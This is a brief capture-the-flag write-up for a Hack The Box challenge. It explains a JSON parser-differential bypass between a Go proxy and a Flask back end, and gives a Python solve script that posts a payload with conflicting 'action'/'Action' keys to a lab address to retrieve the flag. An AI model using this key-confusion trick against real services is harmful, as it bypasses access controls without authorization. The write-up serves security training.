# Space Explorer HTB Very Easy Challenge Writeup

Goal:
```
Send:
{"action":"getcosmic"}{"action":"getSecureCode"}

Results in:
Go sees → getcosmic ✅ forwards request
Flask sees → getSecureCode ✅ returns the flag
```
Solve script:
```python
#!/usr/bin/env python3

import requests

url = "http://154.57.164.79:31759/execute"

payload = b'{"action":"getSecureCode","Action":"getcosmic"}'

r = requests.post(
    url,
    data=payload,
    headers={"Content-Type": "application/json"}
)

print(r.text)

try:
    print("Flag:", r.json()["flag"])
except:
    print("Failed")
```